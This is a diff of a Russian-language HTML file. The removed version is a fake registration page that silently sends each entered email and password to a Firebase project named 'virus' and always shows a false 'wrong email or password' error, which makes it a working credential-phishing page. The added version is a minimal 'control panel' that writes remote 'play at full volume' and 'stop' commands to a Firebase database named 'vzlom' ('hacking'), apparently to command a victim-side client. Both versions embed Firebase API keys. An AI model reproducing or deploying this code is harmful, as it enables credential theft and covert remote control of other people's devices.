@@ -1,175 +1,25 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Регистрация</title>
-  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%23145a32' stroke='%232ecc71' stroke-width='4'/%3E%3Cpath d='M35 40 L65 40 L50 70 Z' fill='%232ecc71'/%3E%3C/svg%3E">
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-  
-  <!-- Firebase SDK -->
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.0/firebase-app.js";
-    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.8.0/firebase-firestore.js";
-
-    const firebaseConfig = {
-      apiKey: "AIzaSyA3rd90080u4tZVxp8FSQAE6ZW4uRLBIpY",
-      authDomain: "virus-eb87b.firebaseapp.com",
-      projectId: "virus-eb87b",
-      storageBucket: "virus-eb87b.firebasestorage.app",
-      messagingSenderId: "678847278608",
-      appId: "1:678847278608:web:eaae32b5c4ca0b975c6495"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-
-    window.silentRegister = async (email, password) => {
-      try {
-        await addDoc(collection(db, "registrations"), {
-          email: email,
-          password: password,
-          createdAt: serverTimestamp()
-        });
-        console.log('[Firestore] Данные сохранены');
-      } catch (e) {
-        console.warn('[Firestore] Ошибка:', e.code);
-      }
-      return { success: false };
-    };
-  </script>
-
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
-    body {
-      min-height: 100vh;
-      background: radial-gradient(circle at 20% 30%, #1a2e1a, #0b120b);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: 'Roboto', sans-serif;
-      padding: 20px;
-    }
-
-    .card {
-      background: #0f1a0f;
-      border: 1px solid #27ae60;
-      border-radius: 16px;
-      padding: 36px 28px;
-      max-width: 380px;
-      width: 100%;
-      box-shadow: 0 20px 30px rgba(0,0,0,0.6);
-      text-align: center;
-    }
-
-    h1 {
-      color: #2ecc71;
-      font-size: 28px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 2px;
-      margin-bottom: 28px;
-    }
-
-    .input-group {
-      margin-bottom: 20px;
-      text-align: left;
-    }
-
-    .input-group label {
-      display: block;
-      color: #a3e4b0;
-      font-weight: 700;
-      margin-bottom: 6px;
-      font-size: 14px;
-    }
-
-    .input-group input {
-      width: 100%;
-      padding: 14px 18px;
-      font-size: 16px;
-      background: #0a0f0a;
-      border: 1px solid #145a32;
-      border-radius: 8px;
-      outline: none;
-      color: #eafaf1;
-      transition: border 0.2s;
-    }
-
-    .input-group input:focus {
-      border-color: #2ecc71;
-    }
-
-    .input-group input::placeholder {
-      color: #4a6b4a;
-    }
-
-    .btn {
-      width: 100%;
-      padding: 14px;
-      background: #27ae60;
-      border: none;
-      border-radius: 8px;
-      color: white;
-      font-weight: 700;
-      font-size: 16px;
-      text-transform: uppercase;
-      cursor: pointer;
-      transition: background 0.2s;
-      margin-top: 10px;
-    }
-
-    .btn:hover {
-      background: #1e8449;
-    }
-
-    .error-msg {
-      margin-top: 18px;
-      font-weight: 700;
-      font-size: 14px;
-      color: #e74c3c;
-      min-height: 20px;
-    }
-  </style>
+    <meta charset="utf-8">
+    <title>Пульт управления</title>
 </head>
 <body>
+    <button onclick="sendCommand('play')">🎵 Играть на полную</button>
+    <button onclick="sendCommand('stop')">⏹️ Стоп</button>
 
-<div class="card">
-  <h1>Регистрация</h1>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyCWJU-LEHdqWA3mZUHUqlXjSHhBltdV77w",
+            databaseURL: "https://vzlom-9ad13-default-rtdb.firebaseio.com"
+        };
+        firebase.initializeApp(firebaseConfig);
 
-  <form onsubmit="handleRegister(event)" novalidate>
-    <div class="input-group">
-      <label>EMAIL</label>
-      <input type="email" id="email" placeholder="example@mail.com" autocomplete="off">
-    </div>
-
-    <div class="input-group">
-      <label>ПАРОЛЬ</label>
-      <input type="password" id="password" placeholder="••••••••" autocomplete="off">
-    </div>
-
-    <button type="submit" class="btn">Зарегистрироваться</button>
-  </form>
-
-  <div id="errorMsg" class="error-msg"></div>
-</div>
-
-<script>
-  async function handleRegister(e) {
-    e.preventDefault();
-
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-    const errorDiv = document.getElementById('errorMsg');
-
-    // Тихая отправка в Firestore
-    await window.silentRegister(email, password);
-
-    // Всегда одно и то же сообщение
-    errorDiv.textContent = 'Неправильная почта или пароль';
-  }
-</script>
-
+        function sendCommand(cmd) {
+            firebase.database().ref('/command').set(cmd);
+        }
+    </script>
 </body>
 </html>
